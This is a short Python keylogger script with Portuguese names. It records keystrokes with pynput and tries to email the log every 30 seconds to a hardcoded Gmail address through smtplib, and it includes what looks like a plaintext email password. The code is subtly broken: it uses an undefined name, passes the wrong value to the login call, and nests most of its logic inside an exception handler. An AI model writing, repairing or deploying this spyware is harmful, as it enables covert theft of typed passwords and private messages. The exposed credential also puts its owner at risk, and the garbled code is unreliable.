from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer
import os

EMAIL_ORIGEM = "dutrajoao220@gmail.com"
EMAIL_DESTINO = "dutrajoao220@gmail.com"
SENHA_EMAIL = "Wo041273"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "dados resenhados"
        msg['FROM'] = EMAIL_ORIGEM
        msg[To] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, EMAIL_DESTINO)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("erro ao enviar", e)

            log = " "

            Timer(30, enviar_email).start()

            def on_press(key):
                global log
                try:
                    log+= key.char
                except AttributeError:
                    if key == keyboard.Key.space:
                        log +=" "
                    elif key == keyboard.Key.enter:
                        log += "\n"
                    elif key == keyboard.Key.backspace:
                        log+="[<]"
                    else:
                        pass

            with keyboard.Listener(on_press=on_press) as listener:
                enviar_email()
                listener.join()